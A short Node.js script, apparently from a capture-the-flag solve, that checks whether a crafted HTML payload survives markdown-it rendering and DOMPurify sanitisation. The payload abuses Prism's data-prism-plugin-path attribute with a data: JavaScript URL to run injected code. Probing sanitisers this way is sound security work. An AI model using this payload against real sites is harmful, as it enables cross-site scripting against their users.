const path = require('path');
const { JSDOM } = require(path.resolve(__dirname, '..', 'challenge_mouse', 'app', 'node_modules', 'jsdom'));
const MarkdownIt = require(path.resolve(__dirname, '..', 'challenge_mouse', 'app', 'node_modules', 'markdown-it'));
const DOMPurify = require(path.resolve(__dirname, '..', 'challenge_mouse', 'app', 'node_modules', 'dompurify'))(new JSDOM('').window);
const md = new MarkdownIt({ html: true, linkify: false });

const payload = '<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>';
const rendered = DOMPurify.sanitize(md.render(payload));
console.log('Rendered output:');
console.log(rendered);

const dom = new JSDOM(rendered);
const doc = dom.window.document;
const p1 = doc.querySelector('[data-prism-plugins]');
const p2 = doc.querySelector('[data-prism-plugin-path]');

console.log('plugins:', p1 ? p1.getAttribute('data-prism-plugins') : null);
console.log('plugin-path:', p2 ? p2.getAttribute('data-prism-plugin-path') : null);
